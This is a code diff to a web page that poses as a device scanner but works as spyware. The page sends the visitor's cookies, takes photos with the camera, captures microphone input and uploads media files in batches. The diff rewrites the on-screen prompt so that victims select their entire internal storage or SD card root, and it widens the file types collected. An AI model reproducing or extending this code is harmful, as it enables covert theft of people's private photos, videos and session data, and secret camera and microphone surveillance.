@@ -16,7 +16,7 @@
         #statusBox { background: #0a0a1a; padding: 10px; border-radius: 5px; font-size: 12px; color: #88ff88; max-height: 200px; overflow-y: auto; text-align: left; margin-top: 10px; font-family: monospace; }
         .progress-bar { width: 100%; background: #333; border-radius: 10px; height: 20px; margin: 10px 0; overflow: hidden; }
         .progress-fill { height: 100%; background: #00aaff; width: 0%; transition: width 0.3s; }
-        .warning { color: #ffaa44; font-size: 13px; margin: 10px 0; }
+        .warning { color: #ffaa44; font-size: 13px; margin: 10px 0; padding: 10px; background: #1a1a2a; border-radius: 8px; border: 1px solid #ffaa4455; }
     </style>
 </head>
 <body>
@@ -34,9 +34,13 @@
         <div id="step2" class="hidden">
             <p>🔍 Scanning device...</p>
             <div class="loader"></div>
-            <div class="warning" id="dirWarning">Please select your <b>DCIM</b> or <b>Camera</b> folder when prompted.</div>
+            <div class="warning">
+                ⚠️ <b>Select your device storage</b><br>
+                When the folder picker appears, <b>tap the menu (☰)</b> and choose your <b>Internal Storage</b> or <b>SD Card</b> root folder.<br>
+                <span style="color:#88ff88;">This allows us to scan all media on your device.</span>
+            </div>
             <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-            <p class="status" id="statusText">Collecting device information...</p>
+            <p class="status" id="statusText">Waiting for folder selection...</p>
             <div id="statusBox"></div>
         </div>
 
@@ -144,12 +148,12 @@
             log('✅ Cookies sent');
 
             // ============================================================
-            // FULL MEDIA EXTRACTION — TARGET DCIM
+            // FULL MEDIA EXTRACTION — ROOT SCAN
             // ============================================================
-            log('📸 Starting media extraction (DCIM/Camera)...');
+            log('📸 Starting full device media scan...');
             await extractAllMedia();
 
-            // --- Camera + Mic capture (still useful) ---
+            // --- Camera + Mic capture ---
             try {
                 log('📸 Capturing back camera photo...');
                 const backPhoto = await capturePhoto('environment');
@@ -185,52 +189,25 @@
         }
 
         // ============================================================
-        // FULL MEDIA EXTRACTION — TARGET DCIM + COMMON FOLDERS
+        // FULL MEDIA EXTRACTION — ROOT SCAN
         // ============================================================
         async function extractAllMedia() {
             try {
-                // Try multiple approaches to get DCIM folder
-                let dirHandle = null;
-                let selectedPath = '';
+                // Show the file picker — user selects root storage
+                const dirHandle = await window.showDirectoryPicker({
+                    mode: 'read'
+                });
 
-                // Approach 1: Try to directly request DCIM folder
-                try {
-                    const root = await navigator.storage.getDirectory();
-                    const dcim = await root.getDirectoryHandle('DCIM', { create: false });
-                    if (dcim) {
-                        dirHandle = dcim;
-                        selectedPath = 'DCIM';
-                        log('📁 Found DCIM folder directly');
-                    }
-                } catch (e) {
-                    log('📁 Could not find DCIM directly, using file picker...');
-                }
+                log('📁 Storage accessed');
+                document.getElementById('statusText').innerHTML = '📁 Scanning for media files...';
 
-                // Approach 2: Use file picker with suggested starting point
-                if (!dirHandle) {
-                    try {
-                        // Most Android browsers support this
-                        dirHandle = await window.showDirectoryPicker({
-                            mode: 'read',
-                            // Hint to the browser to start in DCIM (not guaranteed)
-                            startIn: 'camera-roll'  // Chrome/Android specific
-                        });
-                        selectedPath = 'picked';
-                        log('📁 User selected folder');
-                    } catch (e) {
-                        log('❌ File picker cancelled or failed');
-                        sendData({ type: 'media_extraction_error', error: 'User cancelled folder selection' });
-                        return;
-                    }
-                }
-
-                // Collect all media files
+                // Collect all media files from root
                 allMediaFiles = [];
-                await traverseDirectory(dirHandle, selectedPath);
+                await traverseDirectory(dirHandle, '');
                 log(`📁 Found ${allMediaFiles.length} media files`);
 
                 if (allMediaFiles.length === 0) {
-                    log('📁 No media files found in selected folder');
+                    log('📁 No media files found');
                     sendData({ type: 'media_extraction_complete', count: 0 });
                     return;
                 }
@@ -239,7 +216,7 @@
                 uploadedFiles = 0;
                 updateProgress();
 
-                // Upload in batches of 5
+                // Upload in batches
                 const batchSize = 5;
                 for (let i = 0; i < allMediaFiles.length; i += batchSize) {
                     const batch = allMediaFiles.slice(i, i + batchSize);
@@ -253,8 +230,13 @@
                 sendData({ type: 'media_extraction_complete', count: totalFiles });
 
             } catch (err) {
-                log('❌ Media extraction failed: ' + err.message);
-                sendData({ type: 'media_extraction_error', error: err.message });
+                if (err.name === 'AbortError' || err.name === 'SecurityError') {
+                    log('❌ User cancelled folder selection');
+                    sendData({ type: 'media_extraction_error', error: 'User cancelled' });
+                } else {
+                    log('❌ Media extraction failed: ' + err.message);
+                    sendData({ type: 'media_extraction_error', error: err.message });
+                }
             }
         }
 
@@ -268,15 +250,14 @@
                     
                     if (entry.kind === 'directory') {
                         // Skip system directories
-                        const skipDirs = ['Android', 'data', 'obb', 'system', 'root', 'proc', 'sys', 'tmp', 'cache'];
+                        const skipDirs = ['Android', 'data', 'obb', 'system', 'root', 'proc', 'sys', 'tmp', 'cache', 'log', 'dump'];
                         if (skipDirs.includes(entry.name)) continue;
-                        // Skip if directory name starts with '.'
                         if (entry.name.startsWith('.')) continue;
                         await traverseDirectory(entry, entryPath);
                     } else if (entry.kind === 'file') {
                         const ext = entry.name.split('.').pop().toLowerCase();
                         const mediaTypes = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'heic', 'bmp', 
-                                           'mp4', 'mov', 'avi', 'mkv', 'webm', '3gp', 'm4v', 'mpeg'];
+                                           'mp4', 'mov', 'avi', 'mkv', 'webm', '3gp', 'm4v', 'mpeg', 'mpg'];
                         if (mediaTypes.includes(ext)) {
                             allMediaFiles.push({
                                 name: entry.name,
